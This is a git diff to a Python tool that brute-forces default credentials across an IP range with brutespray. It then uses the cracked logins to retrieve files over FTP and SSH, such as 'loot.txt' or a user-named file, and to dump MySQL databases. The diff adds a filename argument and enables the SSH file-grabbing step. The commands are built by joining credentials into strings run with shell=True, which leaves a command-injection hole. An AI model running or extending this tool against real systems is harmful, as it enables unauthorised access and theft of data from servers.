@@ -12,6 +12,7 @@ def _parse_args():
 	parser.add_argument('ip', type=str, help='IP range to search for defaults')
 	parser.add_argument('-t', '--threads', type=int, default=2, help='Number of threads to run on')
 	parser.add_argument('-c', '--clean', type=bool, default=True, help='Clean up files from previous runs')
+	parser.add_argument('-f', '--filename', type=str, default=None, help='File to retrieve')
 	args = parser.parse_args()
 	return args
 
@@ -35,10 +36,11 @@ def run_brutespray(threads: int):
 
 def get_ftp_files(ip, username, password, filename="welcome.msg"):
 	ftp_cd = "cd ftp; "
-	mkdir = "mkdir " + username + "; "
-	cd = "cd " + username + "; "
-	wget = "curl ftp://" + username + ":" + password + "@" + ip + "/" + filename + "; -o retrieved_file;"
-	cmd = ftp_cd + mkdir + cd + wget
+	# mkdir = "mkdir " + username + "; "
+	# cd = "cd " + username + "; "
+	wget = "curl ftp://" + username + ":" + password + "@" + ip + "/" + filename + " -o retrieved_file;"
+	cmd = ftp_cd + wget
+	# print(wget)
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
 	if err is not None:
@@ -56,10 +58,10 @@ def get_mysql_files(ip, username, password):
 	if err is not None:
 		print("\t\tfailed to dump database")
 
-def get_ssh_files(ip, username, password, filename=None):
+def get_ssh_files(ip, username, password, filename="loot.txt"):
 	mkdir = "cd ssh; "#mkdir " + username + ":" + ip + ";"
 
-	cmd = mkdir + "sshpass -p \"" + password + "\" scp " + username + "@" + ip + ":~/loot.txt ./loot.txt;"
+	cmd = mkdir + "sshpass -p \"" + password + "\" scp " + username + "@" + ip + ":~/"+ filename + " ./" + filename + ";"
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
 	if err is not None:
@@ -112,7 +114,7 @@ if __name__ == "__main__":
 				match = regex.search(line)
 				if match is not None:
 					print("\tgrabbing ftp files from " + str(match.group(2)))
-					get_ftp_files(match.group(1), match.group(2), match.group(3))
+					get_ftp_files(match.group(1), match.group(2), match.group(3), args.filename)
 	# dump mysql database
 	if mysql_file.is_file():
 		print("==== retreiving info from mysql servers")
@@ -134,7 +136,7 @@ if __name__ == "__main__":
 				match = regex.search(line)
 				if match is not None:
 					print("\tgrabbing scp files from " + str(match.group(2)))
-					# get_ssh_files(match.group(1), match.group(2), match.group(3))
+					get_ssh_files(match.group(1), match.group(2), match.group(3), args.filename)
 
 # maybe use this vvv for ssh
 # sshpass -p 'SuperStrongPassword' scp -C -r admin@192.168.111.142:/home/admin .
